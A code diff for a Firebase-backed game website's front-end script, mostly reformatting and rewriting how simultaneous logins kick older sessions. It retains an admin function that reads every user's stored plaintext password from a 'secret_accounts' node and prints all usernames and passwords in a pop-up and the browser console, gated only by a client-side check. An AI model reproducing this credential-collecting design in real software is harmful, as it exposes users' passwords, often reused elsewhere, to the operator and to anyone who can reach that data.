@@ -83,36 +83,23 @@
         return u.email.split('@')[0].toLowerCase() === ADMIN_USERNAME;
     }
 
-    // ★★★ 管理員專屬：查看所有人帳號密碼 ★★★
     window.raingodAdminViewPasswords = async function() {
         if (!isCurrentUserAdmin()) { alert('只有管理員可以使用此功能。'); return; }
-        
         try {
             const snap = await firebase.database().ref('secret_accounts').once('value');
             const data = snap.val();
-            
-            if (!data) {
-                alert('目前沒有任何備份的密碼資料。');
-                return;
-            }
-
+            if (!data) { alert('目前沒有任何備份的密碼資料。'); return; }
             let msg = "=== 所有人帳號密碼 ===\n\n";
             let count = 0;
-            
             for (const key in data) {
                 if (data[key].password_plain) {
                     msg += `帳號: ${data[key].username}\n密碼: ${data[key].password_plain}\n\n`;
                     count++;
                 }
             }
-            
-            if (count === 0) {
-                msg += "(目前沒有記錄到任何明文密碼，請請使用者重新註冊)";
-            }
-            
+            if (count === 0) msg += "(目前沒有記錄到任何明文密碼，請請使用者重新註冊)";
             console.log(msg);
             alert("成功讀取！如果視窗塞不下，請按 F12 查看 Console 觀看完整名單。\n\n" + msg);
-
         } catch (e) {
             alert('讀取失敗：' + e.message);
         }
@@ -135,7 +122,7 @@
     function isGameLocalKey(key) {
         if (!key) return true;
         if (key === 'raingod_device_id') return true;
-        if (key === 'raingod_session_id') return true;   // ★ 保留 session id 不清
+        if (key === 'raingod_session_id') return true;   // ★ 保留 session id
         if (key.startsWith('raingod_save_')) return true;
         if (key.startsWith('raingod_game_lock_')) return true;
         if (key.startsWith('raingod_save_choice_')) return true;
@@ -143,11 +130,11 @@
         return false;
     }
 
-    // === 遊戲鎖（跨分頁 + 跨裝置） ===
+    // === 遊戲鎖 ===
     const activeGameLocks = new Map();
     const GAME_LOCK_PREFIX = 'raingod_game_lock_';
 
-    // === 帳號 session（跨分頁 + 跨裝置，後登入者勝） ===
+    // === 帳號 session ===
     const SESSION_STORAGE_KEY = 'raingod_session_id';
     let _sessionId = null;
 
@@ -188,7 +175,7 @@
         return JSON.stringify((Array.isArray(data) ? data : []).slice().sort((a, b) => a.key.localeCompare(b.key)));
     }
 
-    // ★★★ 修復：不再 clear sessionStorage，只清 save_choice ★★★
+    // ★ 只清 save_choice，保留 raingod_session_id
     function clearLocalAccountData(clearSession = true) {
         const bindings = new Set(storageBindings.values());
         bindings.forEach(binding => { if (binding.pause) binding.pause(); });
@@ -200,7 +187,6 @@
         keys.forEach(key => localStorage.removeItem(key));
         if (clearSession) {
             try {
-                // 只清除 save choice，保留 raingod_session_id
                 for (let i = sessionStorage.length - 1; i >= 0; i--) {
                     const k = sessionStorage.key(i);
                     if (k && k.startsWith('raingod_save_choice_')) {
@@ -291,8 +277,7 @@
         _sessionId = null;
         activeGameLocks.forEach(lock => { try { lock.release(); } catch (e) {} });
         activeGameLocks.clear();
-        // 保留 sessionId，避免刷新後被自己踢
-        clearLocalAccountData(false);
+        clearLocalAccountData(false);   // ★ 保留 sessionId
     };
 
     function scheduleAccountDataSave() {
@@ -485,7 +470,7 @@
         return _tabId;
     }
 
-    // === 遊戲鎖：同裝置用 localStorage、跨裝置用 Firebase ===
+    // === 遊戲鎖 ===
     async function acquireGameLock(gameId, onLost) {
         const sessionId = getSessionId();
         const localKey = GAME_LOCK_PREFIX + gameId;
@@ -568,10 +553,11 @@
         activeGameLocks.clear();
     });
 
-    // --- 多地方登入搶佔（帳號層級：任一分頁／裝置新登入 → 舊的全部登出）---
+    // =============================================================
+    // ★★★ 多地方登入搶佔（核心修復：用 timestamp 判斷誰是後登入者）★★★
+    // =============================================================
     let sessionWatchRef = null;
     let sessionWatchHandler = null;
-    let sessionClaimed = false;   // ★ 修復：標記自己已寫入 session
 
     function stopSessionWatch() {
         if (sessionWatchRef && sessionWatchHandler) {
@@ -582,41 +568,27 @@
         }
         sessionWatchRef = null;
         sessionWatchHandler = null;
-        sessionClaimed = false;
     }
 
-    // ★★★ 修復核心：先 await set() 寫入，再註冊 on('value') ★★★
     async function claimSession(user) {
         stopSessionWatch();
         const sessionId = getSessionId();
+        const myTimestamp = Date.now();
         const sessionRef = firebase.database().ref(`users_sessions/${user.uid}`);
 
-        // Step 1：先寫入自己的 sessionId（成為最新）
-        try {
-            await sessionRef.set({
-                sessionId,
-                deviceId: getDeviceId(),
-                tabId: getTabId(),
-                timestamp: firebase.database.ServerValue.TIMESTAMP
-            });
-        } catch (e) {
-            console.warn('多裝置偵測失敗', e);
-            return;
-        }
-
-        // 寫入後若已換人，直接放棄
-        if (firebase.auth().currentUser?.uid !== user.uid) return;
-
-        sessionClaimed = true;
-
-        // Step 2：寫入完成後再註冊監聽
+        // 先註冊監聽（能收到推播）
         const handler = snap => {
-            if (!sessionClaimed) return;            // ★ 寫入前忽略一切推送
             const val = snap.val();
             if (!val || !val.sessionId) return;
-            if (val.sessionId === sessionId) return; // 自己寫的，不踢
+            if (val.sessionId === sessionId) return;      // 自己的 sessionId，不踢
 
-            // 別人（後登入者）搶佔了 → 我（舊的）登出
+            // ★ 用 timestamp 判斷：只有「比我的 timestamp 更新」的登入才踢我
+            const theirTs = typeof val.timestamp === 'number' ? val.timestamp : 0;
+            if (theirTs <= myTimestamp) {
+                // 對方比我舊（或相同），代表我才是後登入者 → 不踢自己
+                return;
+            }
+
             stopSessionWatch();
             alert('您的帳號已在其他地方登入，本頁將自動登出。');
             const redirect = () => { window.location.href = baseUrl; };
@@ -626,6 +598,19 @@
         sessionWatchRef = sessionRef;
         sessionWatchHandler = handler;
         sessionRef.on('value', handler);
+
+        // 再寫入自己的 sessionId（帶 timestamp）
+        try {
+            await sessionRef.set({
+                sessionId,
+                deviceId: getDeviceId(),
+                tabId: getTabId(),
+                timestamp: myTimestamp
+            });
+        } catch (e) {
+            console.warn('多裝置偵測寫入失敗（可能是 Firebase 規則限制）：', e);
+            // ★ 不 return，監聽器繼續運作，能收到別人的踢
+        }
     }
 
     // --- 自動加載資源 ---
@@ -1262,7 +1247,6 @@
                     listenNavCounts(username, user.uid);
                     syncData(user);
 
-                    // ★★★ 管理員按鈕（只有 raingod 看得到）★★★
                     const isAdmin = username.toLowerCase() === ADMIN_USERNAME;
                     let adminBtn = document.getElementById('raingod-admin-btn');
                     if (isAdmin) {
